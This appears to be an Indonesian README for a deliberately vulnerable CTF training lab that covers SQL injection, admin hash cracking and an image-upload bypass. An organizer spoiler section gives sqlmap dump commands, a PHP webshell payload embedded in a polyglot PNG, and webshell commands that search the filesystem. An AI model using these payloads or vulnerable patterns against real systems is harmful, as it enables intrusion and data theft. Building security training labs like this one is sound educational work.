# LAIN CTF — SQL Injection Lab (sqlmap practice, Easy)

Web CTF latihan SQL injection bertema **Serial Experiments Lain**, dibuat khusus untuk sqlmap. Level: **Easy** (error-based SQLi, tanpa WAF, tanpa rate limit berarti).

> Hanya untuk edukasi. Jangan pernah host ini terbuka ke publik tanpa izin.

---

## Deploy (Ubuntu server / di mana saja dengan Docker)

```bash
docker compose down -v
docker compose up -d --build
```

Akses: `http://<server-ip>:8001`

**Ganti flag/kredensial:** edit `FLAG_SQLI`, `FLAG_ADMIN`, `FLAG_DECOY`, `ADMIN_USERNAME`, `ADMIN_PASSWORD` di `docker-compose.yml`, lalu rebuild. Seeder (`src/includes/seed.php`) berjalan setiap container start dan menimpa isi tabel `secrets` + hash admin, jadi env bisa diubah kapan saja tanpa hapus volume.

## Arsitektur

| Service | Image | Keterangan |
|---|---|---|
| `web` | php:8.2-apache + dockerize | Aplikasi, publish `8001:80` |
| `db` | mysql:5.7 | Port TIDAK dipublish ke host (sqlmap harus lewat web) |

Database:
- `lain` → `secrets` (**flag 1 di sini**; flag admin sengaja TIDAK disimpan di DB), `admin_users` (**kredensial admin asli, MD5**), `knights_messages` (decoy)
- `lain_content` → `episodes` (target query SQLi; dipisah agar dump `lain` tetap ringan)

## URL

| Halaman | URL |
|---|---|
| Landing/list episode | `/` (home.php) |
| Detail episode (rentan, blind) | `/detail.php?id=1` |
| Login admin (tersembunyi) | `/administrator/` |

Link admin sengaja tidak ada di halaman manapun — peserta harus menemukannya dengan dirsearch.

## Tingkat Kesulitan Easy — apa yang berubah

1. **Error-based SQLi** — pesan error MySQL ditampilkan langsung di halaman. sqlmap bisa langsung pakai teknik error-based/union tanpa tamper apa pun.
2. **Tanpa WAF** — tidak ada filter keyword/spasi. Payload apa pun lolos.
3. **Rate limit nyaris hilang** — limit di-set sangat tinggi (100.000 req/menit untuk SQLi, 1.000 percobaan login), jadi praktis tidak terasa. sqlmap jalan full speed tanpa `--delay`.
4. **Flag** — semua flag tetap di dalam database.
5. **Decoy tetap ada** — tabel `knights_messages` berisi pesan pengecoh (bonus edukasi, tidak menghalangi).
6. **Password admin crackable** — hash MD5 dibuat dari password wordlist-friendly (`cyberia2026`); peserta bisa hashcat -m 0 / john, atau paste ke crackstation.net — laptop biasa sanggup.

## 2 Flag + 1 Decoy

| # | Flag | Lokasi | Cara dapat |
|---|---|---|---|
| 1 | `FLAG_SQLI` | `lain.secrets` bucket `flag_sqli` | Error-based/UNION SQLi dump via sqlmap (tanpa tamper) |
| 2 | `FLAG_ADMIN` | **TIDAK di database** — hanya muncul di dashboard `/administrator/dashboard.php` setelah login | Dump `lain.admin_users` → dapat `username:password` → login → flag ditampilkan dari env |
| 3 | `FLAG_UPLOAD` | **File config di filesystem container** — dikubur di `/srv/.config/tachibana/.internal/navi/lain/.wired/netui.cnf` (folder berlapis-lapis tanpa kata "flag", di luar docroot), diselingi 4 file decoy `flag.txt` di lokasi lain | Upload avatar di `/administrator/upload.php` tampaknya hanya menerima gambar (ekstensi + `getimagesize()`) — peserta mengira PHP mustahil masuk. Bypass: polyglot image (payload PHP di dalam PNG/JPG valid) lolos kedua validasi → dieksekusi via `.htaccess` `SetHandler` → webshell → telusuri filesystem, bedakan flag asli dari decoy |
| - | `FLAG_DECOY` | `lain.secrets` bucket `decoy` | Jebakan — bukan flag yang benar untuk submit |

### Detail challenge upload (spoiler organizer)

- Folder upload **dikubur dalam sarang folder berlapis** di bawah `images/`:
  `/images/.cache/assets/gen/thumbs/.store/lain/avatar/` — menyamar sebagai
  struktur cache/asset internal dengan beberapa folder diawali titik.
  Dirsearch tidak akan menebak path sedalam ini; peserta menemukannya dari
  URL preview di response upload.
- Validasi: whitelist ekstensi (`jpg/jpeg/png/gif/webp`) + `getimagesize()`
  (magic bytes) — polyglot image lolos keduanya.
- `.htaccess` di folder terakhir berisi `SetHandler application/x-httpd-php`
  via `FilesMatch` (php:8.2-apache memasang mod_php via SetHandler, jadi
  `AddType` saja tidak cukup) — file `.png` berisi PHP dieksekusi.

```bash
# 1. Buat polyglot PNG + payload PHP
exiftool -Comment='<?php system($_GET["c"]); ?>' lain.png -o avatar.png
#    atau: cat lain.png >> payload.png (append setelah IEND)

# 2. Login admin -> /administrator/upload.php -> upload avatar.png (lolos validasi)
# 3. Buka URL dari response:
#    /images/.cache/assets/gen/thumbs/.store/lain/avatar/avatar.png?c=env
#    -> webshell jalan. Flag BUKAN di env: flag.txt dikubur di
#    /srv/.config/tachibana/.internal/navi/lain/.wired/flag.txt
#    Contoh pencarian: ?c=find / -name flag.txt 2>/dev/null
#    lalu: ?c=cat /srv/.config/tachibana/.internal/navi/lain/.wired/flag.txt
#    -> FLAG_UPLOAD muncul
```

## Walkthrough (ORGANIZER ONLY — spoiler)

```bash
# 0. Deteksi injeksi (error-based langsung ketemu)
sqlmap -u "http://<server>:8001/detail.php?id=1" --batch

# 1. Enumerasi database
sqlmap -u "http://<server>:8001/detail.php?id=1" --batch --dbs
#    -> lain, admin, information_schema

# 2. Dump tabel secrets
sqlmap ... -D lain -T secrets --dump
#    -> flag_sqli = FLAG 1
#    -> decoy    = FLAG_DECOY (jebakan)
#    -> flag_admin TIDAK ADA di sini (tidak pernah disimpan di DB)

# 3. Dump kredensial admin asli
sqlmap ... -D lain -T admin_users --dump
#    -> username: lain_chrono | password_hash: MD5(password)
#    Easy: hash MD5 crackable di laptop biasa. hashcat -m 0 / john,
#    atau tempel ke crackstation.net — password dibuat wordlist-friendly
#    ("cyberia2026").

# 4. Login di /administrator/ dengan kredensial -> FLAG 2 di dashboard

# Reset lengkap
docker compose down -v && docker compose up -d --build
```

> Organizer bisa menaikkan kesulitan kembali: sembunyikan error MySQL
> (`catch` tanpa `$e->getMessage()`), aktifkan lagi WAF + rate limit di
> `detail.php`, atau ganti `ADMIN_PASSWORD` ke string acak panjang.
